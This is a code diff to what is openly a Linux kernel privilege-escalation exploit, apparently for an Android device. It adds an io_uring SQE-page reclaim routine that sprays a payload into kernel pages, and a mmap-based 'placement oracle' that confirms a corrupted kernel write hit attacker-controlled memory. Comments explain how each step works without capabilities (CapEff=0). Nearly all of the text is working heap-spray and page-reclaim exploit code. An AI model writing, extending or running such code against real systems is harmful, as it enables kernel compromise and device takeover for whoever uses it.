@@ -665,6 +665,18 @@ void close_reclaim_sockets(void) {
  *   ret -1 : table signature not found in the stream at all.
  */
 int wproof_spray_verify(uint64_t marker_expect) {
+  /* Ring-mmap oracle first (capless, device-safe): if the walk's marker
+   * write landed in one of OUR claimed ring blocks, the mmap content at
+   * some 0x4000 slot +0x90 changed to marker_expect. */
+  {
+    extern int ring_registry_find(uint64_t, unsigned);
+    if (ring_registry_find(marker_expect, 0x90)) {
+      pr_success("SPRAY_VERIFY RING-HIT: marker %#llx found in our ring "
+                 "mapping — placement CONFIRMED\n",
+                 (unsigned long long)marker_expect);
+      return 1;
+    }
+  }
   static unsigned char sbuf[SKB_SEND_SIZE * 2];
   ssize_t n = recv(reclaim_sv[1], sbuf, sizeof(sbuf),
                    MSG_PEEK | MSG_DONTWAIT);
@@ -774,6 +786,8 @@ int clone_memfd(void) {
  * 0x4000-aligned offset inside each block so base's position within the
  * merged block does not matter. fd+ring intentionally leaked.
  */
+static void ring_map_register(unsigned char *p, size_t len);
+
 static int packet_ring_order(unsigned order, unsigned blocks,
                              unsigned char *payload, size_t plen) {
   int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
@@ -811,10 +825,100 @@ static int packet_ring_order(unsigned order, unsigned blocks,
       memcpy(blk + off, payload, plen);
       stamped++;
     }
+    ring_map_register(blk, bs);
   }
   pr_success("PACKET_RING o%u: %u blocks x %#x claimed, %u stamps\n",
              order, blocks, bs, stamped);
   return 1;
+}
+
+/* Registry of our mmap'd ring blocks (packet + io_uring). The walk's
+ * marker write into a claimed ring page is visible through these mmaps —
+ * a capless placement oracle that works on device (CapEff=0). */
+#define RING_MAP_MAX 2048
+struct ring_map_entry {
+  unsigned char *ptr;
+  size_t len;
+};
+static struct ring_map_entry ring_maps[RING_MAP_MAX];
+static size_t ring_map_cnt;
+
+static void ring_map_register(unsigned char *p, size_t len) {
+  if (ring_map_cnt < RING_MAP_MAX) {
+    ring_maps[ring_map_cnt].ptr = p;
+    ring_maps[ring_map_cnt].len = len;
+    ring_map_cnt++;
+  }
+}
+
+/* Scan every registered ring at each 0x4000 slot for `value` at `off`
+ * (off < 0x4000). Returns 1 when found (placement confirmed). */
+int ring_registry_find(uint64_t value, unsigned off) {
+  for (size_t m = 0; m < ring_map_cnt; m++) {
+    unsigned char *p = ring_maps[m].ptr;
+    size_t len = ring_maps[m].len;
+    for (size_t b = 0; b + 0x4000 <= len; b += 0x4000) {
+      if (b + off + 8 <= len &&
+          *(volatile uint64_t *)(p + b + off) == value)
+        return 1;
+    }
+  }
+  return 0;
+}
+
+/*
+ * IOURING_RING reclaim (capless): io_uring's SQE array is a separate
+ * __get_free_pages(GFP_KERNEL_ACCOUNT|__GFP_ZERO, order) allocation of
+ * entries*64 bytes — entries=256 gives exactly one order-2 UNMOVABLE
+ * page, mmap-writable at the fixed IORING_OFF_SQES offset, no
+ * capabilities required (device shell has CapEff=0 — AF_PACKET dies;
+ * CONFIG_IO_URING=y confirmed). Stamp the copy-A payload at every
+ * 0x4000 offset; fd leaked to hold the page.
+ */
+#define IOURING_SETUP_SYSNR 425
+#define IORING_OFF_SQES 0x10000000ULL
+
+static int iouring_ring_reclaim_one(unsigned char *payload, size_t plen) {
+  unsigned char params[120];
+  memset(params, 0, sizeof(params));
+  long fd = syscall(IOURING_SETUP_SYSNR, 256, params);
+  if (fd < 0)
+    return 0;
+  unsigned int sq_entries = 0;
+  memcpy(&sq_entries, params, sizeof(sq_entries));
+  if (sq_entries == 0 || sq_entries > 4096) {
+    close((int)fd);
+    return 0;
+  }
+  size_t sqlen = (size_t)sq_entries * 64;
+  void *sq = mmap(NULL, sqlen, PROT_READ | PROT_WRITE, MAP_SHARED, (int)fd,
+                  IORING_OFF_SQES);
+  if (sq == MAP_FAILED) {
+    close((int)fd);
+    return 0;
+  }
+  for (size_t off = 0; off + plen <= sqlen; off += 0x4000)
+    memcpy((unsigned char *)sq + off, payload, plen);
+  ring_map_register((unsigned char *)sq, sqlen);
+  return 1;
+}
+
+static int iouring_ring_reclaim(unsigned char *payload, size_t plen) {
+  if (!env_flag("IOURING_RING", 1))
+    return 0;
+  int n = env_int_range("IOURING_RINGS", 64, 1, 512);
+  int ok = 0;
+  for (int i = 0; i < n; i++) {
+    if (!iouring_ring_reclaim_one(payload, plen))
+      break;
+    ok++;
+  }
+  if (ok)
+    pr_success("IOURING_RING: %d rings (order-2 SQE pages) claimed + stamped\n",
+               ok);
+  else
+    pr_info("IOURING_RING: unavailable (errno=%d)\n", errno);
+  return ok > 0;
 }
 
 static int packet_ring_reclaim(unsigned char *payload, size_t plen) {
@@ -1702,6 +1806,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   sched_yield();
   slab_state_snap("after_closes");
   packet_ring_reclaim(skb_buf, 0x500);
+  iouring_ring_reclaim(skb_buf, 0x500);
 
   int churn_count = env_int_range("MM_CHURN", 0, 0, 1024);
   pid_t *churn_pids = NULL;
